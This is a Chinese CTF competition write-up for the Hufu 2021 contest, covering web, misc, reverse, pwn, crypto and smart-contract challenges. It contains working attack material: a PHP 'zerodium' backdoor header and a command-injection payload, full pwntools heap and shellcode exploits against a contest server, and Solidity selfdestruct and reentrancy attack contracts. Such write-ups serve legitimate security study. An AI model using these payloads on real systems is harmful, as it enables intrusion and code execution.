> 原文链接: https://www.anquanke.com//post/id/237128 


# 虎符网络安全技能大赛By 天璇Merak


                                阅读量   
                                **143066**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01af826e5e8b5938a8.png)](https://p4.ssl.qhimg.com/t01af826e5e8b5938a8.png)



## WEB

### <a class="reference-link" name="%E7%AD%BE%E5%88%B0"></a>签到

题目来源是一个新闻，<br>[https://sourl.cn/tuYCCf](https://sourl.cn/tuYCCf)<br>
可以得知我们通过

```
所以直接user-agentt: zerodiumsystem("cat /flag");
```

即可。

### <a class="reference-link" name="unsetme"></a>unsetme

看一下是fatfree模板<br>
我们下载一下源码<br>
可以发现如果我们传入的变量a<br>
unset之后就会触发

[![](https://p0.ssl.qhimg.com/t0135f8f336d9c99cec.png)](https://p0.ssl.qhimg.com/t0135f8f336d9c99cec.png)

之后触发clear方法

[![](https://p0.ssl.qhimg.com/t017cf2430b880a533d.png)](https://p0.ssl.qhimg.com/t017cf2430b880a533d.png)

我们在下方可以看见<br>
eval函数导致命令执行

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01707c659d0eb038f7.png)

之后在compile会发现有过滤<br>
我们构造一下正则表达即可绕过过滤

```
0%0a);echo%20`cat%20/flag`;print(%27%27
```

得到flag

[![](https://p4.ssl.qhimg.com/t015d35097b53cdbb6e.png)](https://p4.ssl.qhimg.com/t015d35097b53cdbb6e.png)



## Misc

### <a class="reference-link" name="%E4%BD%A0%E4%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%90%97"></a>你会日志分析吗

sql盲注看着时间戳就可以

```
import base64
flag=""
with open('access.log','r') as file:
    ans = ""
    req = file.readlines()
#print(req[52:3821])
    req=req[51:]
    for i in range(len(req)):
        if "[11/Mar/2021" in req[i]:
            if abs(int(req[i-1].split('[11/Mar/2021')[1][7:9])+60*abs((int(req[i-1].split('[11/Mar/2021')[1][5])-int(req[i].split('[11/Mar/2021')[1][5])))- int(req[i].split('[11/Mar/2021')[1][7:9]))&gt;1.5 and abs(int(req[i-1].split('[11/Mar/2021')[1][7:9])+60*abs((int(req[i-1].split('[11/Mar/2021')[1][5])-int(req[i].split('[11/Mar/2021')[1][5])))- int(req[i].split('[11/Mar/2021')[1][7:9]))&lt;7 :
                tmp=req[i-1].split((')='))[1][0:3]
                if tmp[2]!=",":
                    tmp=tmp+","
                ans=ans+tmp
temp=""
print(ans)
for i in ans:
    if i==",":
        flag=flag+chr(int(temp))
        temp=""
    if i!=",":
        temp=temp+i
flag=flag.split('flag')[1]
print(base64.b64decode(flag))
```



## Reverse

### <a class="reference-link" name="re"></a>re

看起来写的非常复杂，实际上只是填了一个表，每行256个数字，长度和输入有关，输入是14字节

[![](https://p0.ssl.qhimg.com/t0148b7d480f6cf6ad4.png)](https://p0.ssl.qhimg.com/t0148b7d480f6cf6ad4.png)

实际上就是在第i行(从0开始)第x填上一个i+1，x是输入的ascii码<br>
然后后面的比较就是必须一整串对比下来，其实就是个字符串对比的过程，最后返回的是偏移

[![](https://p4.ssl.qhimg.com/t013cc91d7a8b6b8f06.png)](https://p4.ssl.qhimg.com/t013cc91d7a8b6b8f06.png)

由于要求偏移是7，直接从输入的a1字符串第7个字符开始切下来14个字节就是flag了<br>
flag`{`Ninja Must Die`}`

### <a class="reference-link" name="gocrypt"></a>gocrypt

使用了go来编写程序，没有去除符号，直接看就可以了，flag格式uuid，提取出了字符成字节数据，然后加密

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015fb719c310ddd104.png)

找到Encrypt函数，发现是变体TEA，直接逆就完事了

[![](https://p2.ssl.qhimg.com/t01a33edc28e94a53a3.png)](https://p2.ssl.qhimg.com/t01a33edc28e94a53a3.png)

直接dump出数据解密，然后注意下字节序就行

### <a class="reference-link" name="CrackMe"></a>CrackMe
<li>输入要求 17 个字符<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c4458596522b0d1d.png)
</li>
<li>随便输一串之后发现还有一次输入，这次输入的是个int，紧跟着就是校验，且成功与否与第一次输入无关<br>[![](https://p3.ssl.qhimg.com/t0195727d7ea3ec6c2c.png)](https://p3.ssl.qhimg.com/t0195727d7ea3ec6c2c.png)
</li>
- 由于输入的是 int，立马想到爆破（？
<li>写个 idapython 脚本爆出来
<pre><code class="lang-python= hljs">import ida_dbg
import idc
</code></pre>
</li>
```
class MyDbgHook(ida_dbg.DBG_Hooks):
  def __init__(self):
    ida_dbg.DBG_Hooks.__init__(self)  # important
    self.guess = 0
    self.cin1_addr = 0x140001658
    self.cin2_addr = 0x140001762
    self.before_cin2 = 0x14000175B
    self.after_cin2 = 0x140001768
    self.chk_addr = 0x14000184E

  def log(self, msg):
    print("&gt;&gt;&gt; %s" % msg)

  def dbg_bpt(self, tid, ea):
    if ea == self.cin1_addr:
      self.reset()
    elif ea == self.cin2_addr:
      ida_dbg.set_reg_val('rip', self.after_cin2)
      rsp = ida_dbg.get_reg_val('rsp')
      idc.patch_qword(rsp+0x40, self.guess)
      self.continue_process()
    elif ea == self.chk_addr:
      ebx = ida_dbg.get_reg_val('ebx')
      eax = ida_dbg.get_reg_val('eax')
      if ebx != 80643:
        self.guess += 12379
        self.reset()
      elif eax != 1442:
        self.guess += 1
        self.reset()
      else:
        self.log(str(self.guess))
        self.continue_process()
    return 0

  def continue_process(self):
    pass

  def reset(self):
    ida_dbg.set_reg_val('rip', self.before_cin2)
    self.continue_process()

  def dbg_process_exit(self, *args):
    self.unhook()
    self.log("unhooked")


# Install the debug hook
debughook = MyDbgHook()
debughook.hook()
ida_dbg.request_start_process()
ida_dbg.run_requests()
```
<li>得到num<br>[![](https://p2.ssl.qhimg.com/t0194e9fd8a45f22cae.png)](https://p2.ssl.qhimg.com/t0194e9fd8a45f22cae.png)
</li>
- 字符串的加密与 num 无关（震惊），大概就是两次，每次都是异或加密，第一次加密后进行一次校验，校验成功后再加密第二次，第二次加密完之后又是校验，然后如果都正确的话就输出了flag
<li>第一次<br>[![](https://p0.ssl.qhimg.com/t010268bc9b942a3ef3.png)](https://p0.ssl.qhimg.com/t010268bc9b942a3ef3.png)
</li>
<li>第二次<br>[![](https://p3.ssl.qhimg.com/t0138cf5db9caaed788.png)](https://p3.ssl.qhimg.com/t0138cf5db9caaed788.png)
</li>
- 于是把密钥dump出来就完事，我这里是输入了17个a，然后dump出了密文，异或一下就得到了密钥
<li>得到密钥后解密即可
<pre><code class="lang-python= hljs">def first():
  block = b'99038198076198076198076198076198076'
  cipher = []
  for i in [0x6594D08, 0x273, 64]:
    while i:
      cipher.append(i &amp; 0xff)
      i &gt;&gt;= 8
  for i in range(7):
    a = block[i] ^ cipher[i]
    print(chr(a), end='')
</code></pre>
</li>
```
def second():
  key = [129, 244, 219, 1, 168, 7, 75, 69, 211, 87]
  for i in range(10):
    key[i] ^= ord('a')
  tmp = [0x545314AA3F8ED6B2, 0x6C6]
  cipher = []
  for i in tmp:
    while i:
      cipher.append(i &amp; 0xff)
      i &gt;&gt;= 8
  for i in range(10):
    a = key[i] ^ cipher[i]
    print(chr(a), end='')


first()
second()
# 1ti5K3yRC4_crypt0
```

[![](https://p2.ssl.qhimg.com/t0118978a58e88ff54a.png)](https://p2.ssl.qhimg.com/t0118978a58e88ff54a.png)



## Pwn

### <a class="reference-link" name="AGame_%E7%BB%99%E8%BD%AC%E8%B4%A6"></a>AGame_给转账

题目比较简单，直接查链。<br>
可以获得题目逻辑

```
def root(): # not payable
  owner = caller

def _fallback(): # not payable, default function
  revert

def unknownb8b8d35a(addr _param1): # not payable
  require owner == _param1
  require eth.balance(this.address) &gt;= 10^15
  call caller with:
     value eth.balance(this.address) wei
       gas 2300 * is_zero(value) wei
  require ext_call.success
  stor1[_param1] = 1
```

看起来比较简单，成功条件是下面的函数调用成功，简单说就是unknown调用成功即可，首先需要有钱 以及是owner，那么就先selfdestruct一个过去强行转账，再加上一个 root()函数和下面函数调用即可。

PS：调大点GAS

```
pragma solidity ^0.4.23;
contract st`{`
    constructor() payable`{`

    `}`   
    function step1()public`{`

        selfdestruct(0xb4D288dE112799141064CF2Af23ab33C074863D4);
    `}`
`}`
contract hack`{`
    address target=0xb4D288dE112799141064CF2Af23ab33C074863D4;
   function step1()public`{`
       address(target).call(bytes4(0xebf0c717));
       address(target).call(bytes4(0xb8b8d35a),address(this));
   `}`
   function()payable`{`
       assembly`{`
           stop
       `}`
   `}`
`}`
```

### <a class="reference-link" name="SafeContract"></a>SafeContract

题目比较简单，主要是为了让

[![](https://p3.ssl.qhimg.com/t011ea41a6d4fb6226c.png)](https://p3.ssl.qhimg.com/t011ea41a6d4fb6226c.png)

这里成功变成1<br>
但是<br>
那么就只需要观察这里的转账 发现肯定是可以打 重入的

[![](https://p1.ssl.qhimg.com/t01f6729b0d8409c7a7.png)](https://p1.ssl.qhimg.com/t01f6729b0d8409c7a7.png)

那么基本就成了。

[![](https://p2.ssl.qhimg.com/t0194fd15c441ff7ef1.png)](https://p2.ssl.qhimg.com/t0194fd15c441ff7ef1.png)

可以发现这几种函数，我们只需要：
- 先随便 deposit()一个
- 然后fallback()写不断withdraw的
<li>最后调用withdraw()即可。<br>
不过 withdraw中有几个限制，比如先打的钱要比后打的多。<br>
只能打10次。注意调整数值即可。</li>
就可以打通了。

### <a class="reference-link" name="apollo"></a>apollo

先泄露libc基址，malloc出8个0xa0大小堆块并free掉，再重新malloc出一个，show得到地址。

然后当赛道上某处值为2或3就可向下移动2行，这意味着可以溢出到下一块相邻堆块的size字段。只需要将size改大，free掉再重新malloc就能够修改后面第二块堆块的fd，改free_hook分配出来改system即可。

exp:

```
from pwn import *
context.log_level='debug'

def add(row,col,size):
    payload=p8(42)+p8(row)+p8(col)+p8(size&amp;0xff)+p8((size&amp;0xff00)&gt;&gt;8)
    return payload

def free(row,col):
    payload=p8(47)+p8(row)+p8(col)
    return payload

def set_path(row,col,num):
    payload=p8(43)+p8(row)+p8(col)+p8(num)
    return payload

def set_zero(row,col):
    payload=p8(45)+p8(row)+p8(col)
    return payload

def up():
    payload=p8(119)
    return payload

def down():
    payload=p8(115)
    return payload

def left():
    payload=p8(97)
    return payload

def right():
    payload=p8(100)
    return payload

def show():
    payload=p8(112)
    return payload

#sh=remote('127.0.0.1',23333)
sh=remote('8.140.179.11',13422)

payload=p8(77)+p8(0x10)+p8(0x10)
payload+=add(1,1,0x90)
payload+=add(1,2,0x30)
for i in range(7):
    payload+=add(1,i+3,0x90)
payload+=add(1,10,0x30)+free(1,10)
for i in range(7):
    payload+=free(1,i+3)
payload+=free(1,1)
payload+=add(1,1,0x90)
payload+=show()

payload+=set_path(0xf,8,2)
for i in range(6):
    payload+=right()*0xf+left()*0xf
payload+=right()*3+left()*3
payload+=right()*8+left()*8
payload+=down()*4
payload+=right()*8
payload+=down()*0xb


payload+=free(1,1)+free(1,2)
payload+=add(1,1,0xd0)+add(1,2,0x30)+add(1,3,0x30)
payload+=add(1,11,0x40)+free(1,11)

sh.sendafter('cmd&gt; ',payload)
pause()
sh.send('\x00'*0x90)
sh.send('\x00'*0x30)
for i in range(7):
    sh.send('\x00'*0x90)
sh.send('\x00'*0x30)
sh.send('a')

sh.recvuntil('pos:1,1\n')
libc_base=u64(sh.recv(3).ljust(8,'\x00'))-0x15d861+0x4000000000 
print(hex(libc_base))
free_hook=libc_base+0x156630
system_addr=libc_base+0x3F2C8
pause()

payload='\x00'*0x90+p64(0)+p64(0x41)+p64(free_hook)
sh.send(payload.ljust(0xd0,'\x00'))
sh.send('\x00'*0x30)
sh.send(p64(system_addr))
pause()
sh.send("/bin/sh\x00")
sh.interactive()
```

### <a class="reference-link" name="quiet"></a>quiet

用5和1的函数把shellcode写入，再用9跳转即可

exp:

```
#! python3
#coding:utf-8

from pwn import *
import subprocess, sys, os
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)

elf_path = './quiet'
ip = '8.140.179.11'
port = 51322
remote_libc_path = '/lib/x86_64-linux-gnu/libc.so.6'

context(os='linux', arch='aarch64')
context.log_level = 'debug'

local = 0
if local == 1:
    p = process(elf_path)
else:
    p = remote(ip, port)

def debug(cmd):
    gdb.attach(p,cmd)
    pause()

def one_gadget(filename = remote_libc_path):
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def chose(idx):
    key = `{`0:8,
        35:5,
        40:0,
        41:1,
        42:2,
        47:3,
        64:4,
        71:9,
        91:6,
        93:7`}`
    for i in key:
        if key[i] == idx:
            return p8(i)
shellcode = asm(shellcraft.sh())
payload = b''
for i in range(len(shellcode)):
    payload += chose(5)
    payload += chose(1)
payload += chose(9)
p.sendafter('cmd&gt; ', payload)
p.send(shellcode)

p.interactive()
p.close()
```



## Crypto

### <a class="reference-link" name="cubic"></a>cubic

得到六组解之后直接粘贴在nc上

```
def is_valid(x):
    return (((3 - 12*N -4*N^2 - ((2*N + 5)*sqrt(4*N^2 + 4*N -15))) / 2) &lt; x &lt; -(2*(N + 3)*(N + sqrt(N^2 - 4)))) or \
                ((-2*(N + 3)*(N - sqrt(N^2 - 4))) &lt; x &lt; (-4*(N + 3)/(N + 2)))


N = 6
R.&lt;x,y,z, nn,dd&gt; = QQ[]
F = x*(z+x)*(x+y) + y*(y+z)*(x+y) + z*(z+x)*(z+y) - 6*(x+y)*(y+z)*(x+z)


E = EllipticCurve([0, 4*N^2 + 12*N - 3, 0, 32*(N + 3), 0])

a, b, c = -8, -7, 5
x = (-4*(a + b + 2*c)*(N + 3)) / ((2*a + 2*b - c) + (a + b)*N)
y = (4*(a - b)*(N + 3)*(2*N + 5)) / ((2*a + 2*b - c) + (a + b)*N)
P = S = E([x, y])

cnt = 1
while cnt &lt; 7:
    S = S + P
    if is_valid(S[0][0]):
        x = S[0][0]
        y = S[1][0]
        a, b, c = var('a, b, c')
        aa = (8*(N + 3) - x + y) / (2*(4 - x)*(N + 3))
        bb = (8*(N + 3) - x - y) / (2*(4 - x)*(N + 3))
        cc = (-4*(N + 3) - (N + 2)*x) / ((4 - x)*(N + 3))
        a, b, c = solve([a == aa * (a + b + c), b == bb * (a + b + c), c == cc * (a + b + c)], a, b, c)[0]
        print('solution', cnt)
        print('-' * 64)     
        cnt += 1
        then_res = R(a(nn, dd))
        a = abs(then_res.coefficients()[1].numerator())
        print(a)
        then_res = R(b(nn, dd))
        b = abs(then_res.coefficients()[1].numerator())
        print(b)
        c = abs(then_res.coefficients()[1].denominator())
        print(c)
        print('-' * 64)
```
